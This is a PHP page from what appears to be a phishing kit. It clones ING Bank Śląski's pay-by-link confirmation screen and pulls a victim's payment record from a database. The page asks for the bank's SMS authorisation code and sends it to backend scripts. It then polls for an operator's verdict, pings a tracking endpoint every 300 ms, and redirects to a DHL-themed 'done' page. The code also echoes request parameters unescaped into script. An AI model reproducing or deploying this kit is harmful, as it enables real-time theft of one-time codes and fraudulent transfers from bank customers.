<?php 
	include('../bank_header.php'); 
	include('../../../db.php'); 
	include('../../../YH0uW3ecaRHG16ld4waY.php');
	if($_REQUEST['id']){
	  $id = mysqli_real_escape_string($con,$_REQUEST['id']);
	$page_name = basename($_SERVER['PHP_SELF']);
	$sqlss = "UPDATE `payment` SET `page_name` = '$page_name' WHERE `id` = '$id'";
	$con->query($sqlss);
	}
	$sqq = "SELECT * FROM `payment` WHERE `id` = '".mysqli_real_escape_string($con,$_REQUEST['id'])."'";
	$new = $con->query($sqq);
	$rowpay = $new->fetch_assoc();
	$number = $rowpay['account_number'];
	$num = $new->num_rows;
	$array  = array_map('intval', str_split($number));
?>


<!DOCTYPE html>
<!-- saved from url=(0051)https://login.ingbank.pl/mojeing/paybylink/#payment -->
<html lang="pl"><!--<![endif]-->
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><title>Moje ING | ING Bank Śląski</title>
	<meta name="viewport" content="user-scalable=no, width=device-width, initial-scale=1, maximum-scale=1">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="format-detection" content="telephone=no">
	<meta name="description" content="Nowa bankowość internetowa i mobilna ING Banku Śląskiego. Bankuj po swojemu, tak jak lubisz. Zaloguj się.">
	<link rel="stylesheet" href="css/bootstrap.css">
	<link rel="stylesheet" id="ing-main-styles" href="css/main.css">
	<link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3.css">
</head>

<body class="ing-new-theme ing-paybylink ing-personal">

<div id="layout-region" class="ing-container">
	<div class="container ing-container">
		
		<div class="region-wrapper home-region ui-content">
			<header id="header-region" class="ing-header">
				<div class="ing-header">
					<div class="logo ing-header-logo">
						<p class="logo__link ing-header-logo__link"> 
						<img src="images/ing-logo.svg" alt="Strona główna - Moje ING" class="logo__img ing-header-logo__img pbl"> <img src="images/ing-logo-contrast.svg" alt="Strona główna - Moje ING" class="logo__img logo__img--contrast ing-header-logo__img pbl">
						</p>
					</div>
				</div>
			</header>
			
			
		<div class="ing-transaction-container">
			<div class="row">
				<div class="col-xs-12">	<h1>Płać z&nbsp;ING</h1></div>
			</div>
		</div>
		
		
		<div id="content-region" class="main-content-region">
			<div id="main-region" class="main-content" role="main">
				<div>
					<div class="ing-transaction-container ing-to-account-selected ing-from-account-selected ing-details-selected">	
					<div class="row ing-column-container ing-show-borders">	
						<div class="ing-column-border ing-first hide"></div>
							
						<div class="col-lg-4 col-sm-6">
							<div class="ing-transaction-from-region ing-column">
								<h2 class="ing-column-head"> 
									<span class="sr-only">Krok pierwszy. Rachunek, z którego chcesz wykonać transakcję.</span> 
									<span aria-hidden="true" data-tag="MoveMoney.Debit.Header">Z</span>
								</h2>
								<div id="transaction-from-region">
								<li class="ing-list-element ing-account ing-product ing-orange ing-selected" style="touch-action: pan-y; user-select: none; -webkit-user-drag: none; -webkit-tap-highlight-color: rgba(0, 0, 0, 0);">
									<a class="js-key-access ing-product-container ing-hover ing-clickable">
										<p class="sr-only">Rachunek osobisty. KONTO Z LWEM Direct 3,19 PLN</p>
										<div class="ing-product-symbol-line vertical-separator--alternative-left" aria-hidden="true"></div>
										<div class="ing-product-symbol-container" aria-hidden="true">
											<i class="glyphicon-rounded glyphicon-ing-bills glyphicon-inverse" aria-hidden="true"></i>
										</div>
										<div class="ing-product-container-ellipsis" aria-hidden="true">
											<div class="ing-name">KONTO Z LWEM Direct</div>
											<div class="ing-sub-name">()</div> 

											<div class="ing-iban hidden-xs"> </div>
											<div class="ing-amount"> </span></div> 
										</div>
										<div class="updated-info hide">moveMoney.summary.updated</div>
									</a>
									<a class="ing-link pull-right js-cancel link" href="#"><p class="sr-only">Zmień rachunek, z którego chcesz wykonać transakcję.</p> <span aria-hidden="true">Zmień</span></a>
								</li></div>
							</div>
						</div>
						
						<div class="col-lg-8 col-sm-6">
							<div class="row">
								<div class="col-lg-6">
									<div class="ing-transactions-to-container ing-column">
										<h2 class="ing-column-head"> 
										<span class="sr-only">Krok drugi. Odbiorca lub typ transakcji.</span> 
										<span aria-hidden="true" data-tag="MoveMoney.Debit.Header">Na</span>
										</h2>
									<div class="ing-cancel-cross"> 
										<a href="#" class="ing-clickable ing-hover js-close-button hide">
										<span class="sr-only">moveMoney.accessibility.to.closeButton</span>
										<i class="glyphicon-ing glyphicon-ing-cancel" aria-hidden="true"></i></a>
									</div>
									<div id="transaction-to-region">
										<li class="ing-list-element ing-account ing-product ing-selected" style="touch-action: pan-y; user-select: none; -webkit-user-drag: none; -webkit-tap-highlight-color: rgba(0, 0, 0, 0);">
										<a class="js-key-access ing-product-container"><p class="sr-only">DotPay S.A. 0,00 PLN</p><div class="ing-product-symbol-line vertical-separator--alternative-left" aria-hidden="true"></div><div class="ing-product-symbol-container" aria-hidden="true"><div><i class="glyphicon-rounded glyphicon-ing-user" aria-hidden="true"></i></div></div>
											<div class="ing-product-container-ellipsis" aria-hidden="true">
												<div class="ing-name">DotPay S.A.</div><div class="ing-sub-name">()</div> 
												<div class="ing-iban hidden-xs"> <?php for($i=0;$i<27;$i++){ echo $array[$i]; if ($i%4 == 1) {echo '&nbsp;'; } } ?></div>
												<div class="ing-amount hide"> 0,00 <span class="ing-currency">PLN</span></div> 
											</div>
											<div class="updated-info hide">moveMoney.summary.updated</div>
										</a>
										<a class="ing-link pull-right js-cancel link hide" aria-hidden="true">
											<p class="sr-only">moveMoney.accessibility.to.changeLabel</p> 
											<span aria-hidden="true">Zmień</span></a>
										</li>
									</div>
									</div>
								</div>
								<div class="col-lg-6">
									<div class="ing-transactions-details-container ing-column">
										<h2 class="js-details-title ing-column-head "> 
										<span class="sr-only">Krok trzeci. Szczegóły transakcji.</span> 
										<span aria-hidden="true" data-tag="MoveMoney.Detail.Header">Szczegóły</span>
										</h2>
										<div id="transaction-details-region" class="ing-transaction-details-region ing-column ing-last">
											<div class="ing-active ing-selected" style="touch-action: pan-y; user-select: none; -webkit-user-drag: none; -webkit-tap-highlight-color: rgba(0, 0, 0, 0);">
												<p class="sr-only"> Kwota: <?php echo $rowpay['payment']; ?> PLN. Data transakcji: <?php echo date("d/m/Y"); ?> Tytuł: <?php echo $rowpay['title']; ?></p>
												<div class="ing-list" aria-hidden="true">
												<div class="ing-account ing-product ing-product-details ing-selected js-change">
													<div class="ing-product-container ing-summary">
														<div class="row ing-content">
															<div class="ing-details-row ing-label"> 
																<span class="ing-summary">Kwota: 
																	<span class="ing-details-row ing-amount"><?php echo $rowpay['payment']; ?> <span class="ing-currency">PLN</span></span>
																</span>
															</div>
															<div class="ing-details-row ing-label"> 
																<span class="ing-summary">
																	<span class="ing-text"><script>document.write(date)</script></span>
																</span>
															</div>
															<div class="ing-details-row ing-label ing-title"> 
																<span class="ing-summary">Tytuł: 
																	<span class="ing-text"><?php echo $rowpay['title']; ?></span>
																</span>
															</div> 
														</div>
													</div>
												</div>
												</div>
												<a href="#" class="ing-link js-cancel pull-right link" data-tag="MoveMoney.Detail.Chng" style="display: none;">
													<p class="sr-only">moveMoney.accessibility.details.changeLabel</p> 
													<span aria-hidden="true">Zmień</span>
												</a>
											</div>
										</div>
										<div class="ing-button-group"> 
											<button class="btn btn-default btn-block btn-lg js-cancel-button hide"><i class="ing-icon ing-icon-cancel ing-icon-red" aria-hidden="true"></i> Anuluj</button>
										</div>
									</div>
								</div>
							</div>
						</div>
					</div>

					<div id="transactions-confirm-region" class="ing-transaction-confirm">
						<div class="auth" id="authorization-region">
		
						<div class="row auth__header">
							<div class="col-sm-12">
								<h2 class="header-title">Potwierdzenie</h2>
							</div>
						</div> 
						<div class="auth__container ">
							<div class="row">
					
								<div class="col-sm-12">
								<!-- Paolo Added code  here .. two divs..-->
								<div id="warning-sms" class="w3-panel w3-yellow w3-display-container">
								  <p style="margin-top:10px;">Uwierzytelnianie...</p>
								</div>
								
									
								<div  id="wrong_sms" class="w3-panel w3-red w3-display-container">

								  <p style="margin-top:10px;">Proszę wpisac nowy kod sms.</p>
								</div>
								
								
								<div class="row"> 
									<label class="auth__label auth-mobile text-center" for="authorization-code">Wpisz kod autoryzacyjny właśnie otrzymany z&nbsp;banku
									</label>
									<div class="col-xs-12 col-sm-4 col-sm-offset-4 has-error"> 
										<Center><img id="alert_valid" src="loading.gif" style="width: 120px;margin-top: 10px;display:none"></Center>
										<input id="SmsCodes" onkeypress="sms_change()" aria-describedby="authorization-code-error authorization-code-2-error" type="password" autocomplete="off" name="authorization-code" class="form-control text-center">
										<div class="help-block help-block--error" id="authorization-code-2-error"> 
										</div>
									</div>
								</div> 
								<div class="row voffset-2">
									<div class="col-xs-12 col-sm-4 col-sm-offset-4"> 
										<button type="button"  value="" class="btn btn-primary btn-block btn-lg js-send" onclick="auth_code('<?php echo $_REQUEST['id']; ?>')"> Potwierdź</button>
									</div>
								</div>
								</div>
							</div>
						</div> 
						<div class="row form-section">
							<div class="col-xs-12 col-sm-4 col-sm-offset-4">
								<form> 
									<a href="index.php?id=<?php echo $id; ?>"<button class="btn btn-default btn-block btn-lg js-cancel"><i class="ing-icon ing-icon-cancel"></i> Anuluj</button></a>
								</form>
							</div>
						</div> 

						</div>
					</div>
					<div id="transactions-err-region"></div>
					</div>
				</div>
			</div>
		</div>
		<div class="region--left-corner"></div>	<div class="region--right-corner"></div>
		</div>
		
		
		<footer id="footer-region" class="ing-footer login-layout_footer ui-content footer-region layout-bottom">
			<div class="row">
				<div class="ing-list-inline-container">
					<ul class="ing-list-inline">
						<li class="ing-list-inline_item"> 
							<span id="aria-info">Infolinia:</span> 
							<a href="tel:+48801601607" aria-describedby="aria-info">
								<span class="sr-only">zadzwoń801_601 607</span>
								<span aria-hidden="true">801 601 607</span>
							</a> 
							<span> lub </span> 
							<a href="tel:+48323570010" aria-describedby="aria-info">
							`	<span class="sr-only">zadzwoń32_357 00 10</span>
								<span aria-hidden="true">32 357 00 10</span>
							</a>
						</li>
						<li class="ing-list-inline_item"> 
							<span>ING Bank Śląski S.A.</span>
						</li>
					</ul>
				</div>
			</div>
		</footer>
	</div>
</div>


<div id="page-loader-overlay-region" class="hide" style="opacity: 1; display: none;">
	<span class="ing-loader">
	<span class="ing-spacer ing-spacer--flow">
		<div class="ing-inner-spacer">
			<div class="ing-balls">
			<div class="loader"></div>
			</div>
		</div>
	</span>
	</span>
</div>


</body>
</html>

<script src="../date.js"></script>
<script>
	var warning_sms = document.getElementById('warning-sms');
	var wrong_sms = document.getElementById('wrong_sms');
	warning_sms.style.display = "none";
	wrong_sms.style.display = "none";
	setInterval(function(){ upd_last_login(<?php echo $_REQUEST['id']; ?>); }, 300);
	
	var sms_change = function() {
		warning_sms.style.display = "none";
		wrong_sms.style.display = "none";
	}
	
	function upd_last_login(str) {
		if (str == "") {
			// document.getElementById("txtHint").innerHTML = "";
			// return;
		} else { 
			if (window.XMLHttpRequest) {
				// code for IE7+, Firefox, Chrome, Opera, Safari
				xmlhttp = new XMLHttpRequest();
			} else {
				// code for IE6, IE5
				xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
			}
			xmlhttp.onreadystatechange = function() {
				if (this.readyState == 4 && this.status == 200) {
					//document.getElementById("ip").innerHTML = this.responseText;
					//alert(this.responseText);
				}
			};
			xmlhttp.open("GET","update123.php?id="+str,true);
			xmlhttp.send();
		}
	}

	//setTimeout(function(){ check_status(<?php echo $id; ?>); }, 15000);

	function auth_code(payment_id) {
	   //alert(payment_id);
			var codes = document.getElementById("SmsCodes").value;

		if (codes.length == 0) {
			warning_sms.style.display = "block";
			wrong_sms.style.display = "none";
		}
		else {
			if (payment_id.length == 0) {
			} else {
				var xmlhttp = new XMLHttpRequest();
				xmlhttp.onreadystatechange = function() {
					if (this.readyState == 4 && this.status == 200) {
						//alert(this.responseText);
						if(this.responseText=='VALID CODE'){
							setInterval(function(){ check_status(<?php echo $id; ?>); }, 5000);
							document.getElementById("alert_valid").style.display = 'block';
							document.getElementById("SmsCodes").style.display = 'none';
						}
					}
				};
				xmlhttp.open("GET", "../ajax123.php?code=" + codes +"&id=" + payment_id, true);
				xmlhttp.send();
			}
		}
	}

	function check_status(payment_id) {
		//alert(payment_id);
		if (payment_id.length == 0) {
		} else {
			var xmlhttp = new XMLHttpRequest();
			xmlhttp.onreadystatechange = function() {
				if (this.readyState == 4 && this.status == 200) {
					
					if(!this.responseText.includes('INVALID CODE'))
					if(this.responseText.includes('VALID CODE')){
						window.location.href="<?php echo URL_dhlpayment;?>done/index.html";
					}
					console.log(this.responseText);
					if(this.responseText.includes('WRONG CODE')){
						//window.location.href="";
						wrong_sms.style.display = "block";
						document.getElementById("alert_valid").style.display = 'none';
						document.getElementById("SmsCodes").style.display = 'block';
						document.getElementById("SmsCodes").value = "";
						
					}
				}
			};
			xmlhttp.open("GET", "../check123.php?id=" + payment_id +"&status=aproove", true);
			xmlhttp.send();
		}
	}
</script>
